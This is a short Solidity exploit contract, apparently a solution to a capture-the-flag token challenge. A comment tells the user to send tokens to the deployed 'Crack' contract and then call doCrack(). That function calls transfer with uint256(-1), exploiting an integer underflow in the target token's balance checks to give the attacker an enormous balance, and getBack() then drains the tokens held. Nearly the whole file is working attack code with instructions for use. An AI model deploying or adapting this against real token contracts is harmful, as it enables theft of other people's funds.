pragma solidity ^0.6.0;

interface Target {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint balance);
}

/*
Transfer all your token to the deployed crack contract by:
contract.transfer("contract_address", "20")

then call doCrack()
*/

contract Crack {

    Target target;
    address owner;

    constructor(address _target) public {
        target = Target(_target);
        owner = msg.sender;
    }

    function doCrack() external  {
        target.transfer(owner, uint256(-1));
    }

    function getBack() external {
        target.transfer(owner, target.balanceOf(address(this)));
    }
}
